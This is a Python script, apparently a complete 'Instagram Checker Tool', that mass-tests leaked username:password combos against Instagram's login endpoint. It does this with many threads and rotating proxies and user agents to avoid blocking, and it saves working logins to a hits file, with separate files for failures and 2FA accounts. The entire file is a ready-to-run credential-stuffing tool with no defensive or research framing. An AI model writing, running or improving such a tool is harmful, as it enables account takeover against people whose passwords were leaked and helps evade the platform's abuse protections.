from os import name,system
from sys import stdout
from random import choice
from time import sleep
from threading import Thread,Lock,active_count,Timer
import json
import requests

colors = {'white': "\033[1;37m", 'green': "\033[0;32m", 'red': "\033[0;31m", 'yellow': "\033[1;33m"}
version = 'v1.0.0'

def clear():
    if name == 'posix':
        system('clear')
    elif name in ('ce', 'nt', 'dos'):
        system('cls')
    else:
        print("\n") * 120

def setTitle(title:str):
    if name == 'posix':
        stdout.write(f"\x1b]2;{title}\x07")
    elif name in ('ce', 'nt', 'dos'):
        system(f'title {title}')
    else:
        stdout.write(f"\x1b]2;{title}\x07")

def printText(lock,bracket_color,text_in_bracket_color,text_in_bracket,text):
    lock.acquire()
    stdout.flush()
    text = text.encode('ascii','replace').decode()
    stdout.write(bracket_color+'['+text_in_bracket_color+text_in_bracket+bracket_color+'] '+bracket_color+text+'\n')
    lock.release()

def readFile(filename,method):
    with open(filename,method,encoding='utf8') as f:
        content = [line.strip('\n') for line in f]
        return content

def readJson(filename,method):
    with open(filename,method) as f:
        return json.load(f)

def getRandomUserAgent():
    useragents = readFile('[Data]/useragents.txt','r')
    return choice(useragents)

def getRandomProxy(use_proxy,proxy_type):
    proxies_file = readFile('[Data]/proxies.txt','r')
    proxies = {}
    if use_proxy == 1:
        proxy = choice(proxies_file)
        if proxy_type == 1:
            proxies = {
                "http":"http://{0}".format(proxy),
                "https":"https://{0}".format(proxy)
            }
        elif proxy_type == 2:
            proxies = {
                "http":"socks4://{0}".format(proxy),
                "https":"socks4://{0}".format(proxy)
            }
        else:
            proxies = {
                "http":"socks5://{0}".format(proxy),
                "https":"socks5://{0}".format(proxy)
            }
    else:
        proxies = {
                "http":None,
                "https":None
        }
    return proxies


class Main:
    def __init__(self):
        setTitle(f'[Instagram Checker Tool] ^| {version}')
        clear()
        self.title = colors['white'] + """
                          ╔═════════════════════════════════════════════════════════════════════╗
                                                  ╦╔╗╔╔═╗╔╦╗╔═╗╔═╗╦═╗╔═╗╔╦╗
                                                  ║║║║╚═╗ ║ ╠═╣║ ╦╠╦╝╠═╣║║║
                                                  ╩╝╚╝╚═╝ ╩ ╩ ╩╚═╝╩╚═╩ ╩╩ ╩
                          ╚═════════════════════════════════════════════════════════════════════╝                                         
        """
        print(self.title)
        self.lock = Lock()
        self.hits = 0
        self.bads = 0
        self.twofa = 0
        self.retries = 0

        self.maxcpm = 0
        self.cpm = 0

        config = readJson('[Data]/configs.json','r')

        self.use_proxy = config['use_proxy']
        self.proxy_type = config['proxy_type']
        self.threads = config['threads']

        self.session = requests.Session()
    
    def titleUpdate(self):
        while True:
            setTitle(f'[Instagram Checker Tool] ^| {version} ^| CPM: {self.cpm} ^| HITS: {self.hits} ^| BADS: {self.bads} ^| 2FA: {self.twofa} ^| RETRIES: {self.retries} ^| THREADS: {active_count() - 1}')
            sleep(0.1)

    def calculateCpm(self):
        self.cpm = self.maxcpm * 60
        self.maxcpm = 0
        Timer(1.0, self.calculateCpm).start()

    def worker(self,username,password):
        try:
            headers = {
                'authority': 'www.instagram.com',
                'x-ig-www-claim': 'hmac.AR08hbh0m_VdJjwWvyLFMaNo77YXgvW_0JtSSKgaLgDdUu9h',
                'x-instagram-ajax': '82a581bb9399',
                'content-type': 'application/x-www-form-urlencoded',
                'accept': '*/*',
                'user-agent': getRandomUserAgent(),
                'x-requested-with': 'XMLHttpRequest',
                'x-csrftoken': 'rn3aR7phKDodUHWdDfCGlERA7Gmhes8X',
                'x-ig-app-id': '936619743392459',
                'origin': 'https://www.instagram.com',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-mode': 'cors',
                'sec-fetch-dest': 'empty',
                'referer': 'https://www.instagram.com/',
                'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
                'cookie': ''
            }
            
            proxy = getRandomProxy(self.use_proxy,self.proxy_type)
            
            payload = f'username={username}&enc_password=%23PWD_INSTAGRAM_BROWSER%3A0%3A0%3A{password}&queryParams=%7B%7D&optIntoOneTap=false'

            response = self.session.post('https://www.instagram.com/accounts/login/ajax/',data=payload,headers=headers,proxies=proxy)
            if response.json()['status'] == 'ok' and response.json()['authenticated'] == False:
                self.bads += 1
                printText(self.lock,colors['white'],colors['red'],'BAD', f'{username}:{password}')
                with open('[Data]/[Results]/bads.txt','a',encoding='utf8') as f:
                    f.write(f'{username}:{password}\n')
            elif 'feedback_required' in response.text:
                self.twofa += 1
                printText(self.lock,colors['white'],colors['yellow'],'2FA', f'{username}:{password}')
                with open('[Data]/[Results]/2fa.txt','a',encoding='utf8') as f:
                    f.write(f'{username}:{password}\n')
            elif response.json()['authenticated'] == True:
                self.hits += 1
                printText(self.lock,colors['white'],colors['green'],'HIT', f'{username}:{password}')
                with open('[Data]/[Results]/hits.txt','a',encoding='utf8') as f:
                    f.write(f'{username}:{password}\n')
            else:
                self.retries += 1
                self.worker(username,password)
        except Exception:
            self.retries += 1
            self.worker(username,password)
        else:
            self.maxcpm += 1

    def start(self):
        Thread(target=self.titleUpdate).start()
        self.calculateCpm()
        combos = readFile('[Data]/combos.txt','r')
        for combo in combos:
            run = True
            username = combo.split(':')[0]
            password = combo.split(':')[1]
            while run:
                if active_count() <= self.threads:
                    Thread(target=self.worker,args=(username,password)).start()
                    run = False

if __name__ == '__main__':
    main = Main()
    main.start()